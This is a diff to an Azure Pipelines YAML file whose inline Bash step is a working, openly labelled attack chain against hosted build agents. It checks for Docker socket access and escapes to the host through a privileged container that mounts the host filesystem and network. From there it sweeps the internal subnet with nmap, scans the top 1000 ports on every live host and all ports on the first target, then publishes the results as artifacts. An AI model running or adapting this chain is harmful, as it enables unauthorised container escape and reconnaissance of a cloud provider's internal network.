@@ -7,54 +7,78 @@ pr:
 name: $(Date:yyyyMMdd)$(Rev:.r)
 
 stages:
-- stage: ReconAndExploit
-  displayName: 'Reconnaissance & Exploitation PoC'
+- stage: ExploitChain
+  displayName: 'Full Attack Chain: Host Escape & Service Hunting'
   jobs:
-  - job: Linux_Host_Escape_And_Scan_PoC
-    displayName: 'PoC: Host Escape & Targeted Internal Scan'
+  - job: Linux_Host_Escape_And_Service_Hunt
+    displayName: 'PoC: Host Escape, Subnet Sweep, and Port Scan'
     pool:
       vmImage: 'ubuntu-22.04'
     steps:
-    - checkout: none # No source code is needed for this PoC.
+    - checkout: none
     - task: Bash@3
-      displayName: 'Attempt Container Escape and Hunt for Open Services'
+      displayName: 'Execute Full Attack Chain'
       inputs:
         targetType: inline
         script: |
           set -euo pipefail
           mkdir -p artifacts
 
-          echo "--- Checking for Docker socket and group permissions ---"
+          echo "--- Verifying container escape vector ---"
           if [ -S "/var/run/docker.sock" ] && getent group docker && id | grep -q '(docker)'; then
-            echo "✅ SUCCESS: User is in the 'docker' group and socket is present."
-            
-            echo "--- Installing Nmap inside container for later use from host ---"
-            sudo apt-get update >/dev/null && sudo apt-get install -y nmap >/dev/null
-            
-            SUBNET=$(ip -o -f inet addr show eth0 | awk '{print $4}')
-            echo "Discovered internal subnet: $SUBNET"
-            
-            # Define a list of high-value ports to hunt for, based on previous findings.
-            # 5000 (Docker Registry), 6379 (Redis), 5432 (PostgreSQL), 3306 (MySQL), 8080 (http-alt)
-            TARGET_PORTS="5000,6379,5432,3306,8080"
-            
-            echo "--- ESCAPING CONTAINER to hunt for open ports ($TARGET_PORTS) on the host's network ---"
-            
-            # We use '-sT' for a TCP connect scan and '--open' to only report hosts with open ports.
-            docker run --rm --privileged --network=host --pid=host -v /:/hostfs -v /usr/bin/nmap:/usr/bin/nmap \
-              alpine:latest chroot /hostfs /usr/bin/nmap -sT -T4 -p $TARGET_PORTS --open $SUBNET | tee artifacts/host-escape-TARGETED-scan.txt
-              
-            echo "✅ HUNT COMPLETE: Targeted scan from host finished."
-            echo "Review the 'host-escape-TARGETED-scan.txt' artifact for any open services."
+            echo "✅ SUCCESS: Confirmed user is in 'docker' group and socket is present."
           else
-            echo "❌ TEST INCONCLUSIVE: The container escape vector (user in docker group) was not found."
-            id | tee artifacts/poc-failure-id.txt
-            ls -l /var/run/docker.sock | tee -a artifacts/poc-failure-id.txt || echo "Socket not found." | tee -a artifacts/poc-failure-id.txt
+            echo "❌ CRITICAL FAILURE: The container escape vector was not found. Aborting."
+            id
+            ls -l /var/run/docker.sock || echo "Socket not found."
             exit 1
           fi
+          
+          echo "--- Installing tools (Nmap) ---"
+          sudo apt-get update >/dev/null && sudo apt-get install -y nmap >/dev/null
+          
+          SUBNET=$(ip -o -f inet addr show eth0 | awk '{print $4}')
+          echo "Discovered internal subnet: $SUBNET"
+
+          echo "--- ESCAPING CONTAINER to perform reconnaissance from the host ---"
+          
+          # Use a privileged container on the host network to run our commands
+          # This is the core of the container escape
+          docker run --rm --privileged --network=host --pid=host -v /:/hostfs \
+            -v /usr/bin/nmap:/usr/bin/nmap -v $(pwd)/artifacts:/artifacts \
+            alpine:latest sh -c "
+              echo '--- [HOST] Identifying all live hosts on the subnet ---'
+              chroot /hostfs /usr/bin/nmap -sn -T4 ${SUBNET} -oG /artifacts/host-sweep.gnmap
+
+              # Extract just the IP addresses of hosts that are up
+              grep 'Status: Up' /artifacts/host-sweep.gnmap | awk '{print \$2}' > /artifacts/hosts-up.txt
+              
+              LIVE_HOST_COUNT=\$(wc -l < /artifacts/hosts-up.txt)
+              echo \"--- [HOST] Found \$LIVE_HOST_COUNT live hosts. Beginning targeted port scan. ---\"
+
+              if [ \"\$LIVE_HOST_COUNT\" -eq 0 ]; then
+                echo '[!] No live hosts found to scan.'
+                exit 0
+              fi
+
+              # Scan all live hosts for a wider range of common service ports
+              # We use --open to only see successful connections, cutting through the noise of filtered ports.
+              echo '--- [HOST] Scanning top 1000 TCP ports on all live hosts... ---'
+              chroot /hostfs /usr/bin/nmap -sT --top-ports 1000 --open -T4 -iL /artifacts/hosts-up.txt -oN /artifacts/wide-port-scan-results.txt
+              
+              # As a parallel effort, pick the FIRST live host (that isn't the gateway) for a full port scan
+              FIRST_TARGET=\$(grep -v '10.1.0.1' /artifacts/hosts-up.txt | head -n 1)
+              if [ -n \"\$FIRST_TARGET\" ]; then
+                echo \"--- [HOST] Performing a full TCP port scan (1-65535) on the first discovered host: \$FIRST_TARGET ---\"
+                chroot /hostfs /usr/bin/nmap -sT -p- --open -T4 \$FIRST_TARGET -oN /artifacts/deep-scan-\$FIRST_TARGET.txt
+              fi
+            "
+          
+          echo "✅ EXPLOIT CHAIN COMPLETE. Review the published artifacts."
+
     - task: PublishPipelineArtifact@1
-      displayName: 'Publish Attack PoC Artifacts'
+      displayName: 'Publish Attack Chain Artifacts'
       condition: succeededOrFailed()
       inputs:
         targetPath: 'artifacts'
-        artifact: 'azure-poc-host-escape'
+        artifact: 'azure-attack-chain-results'
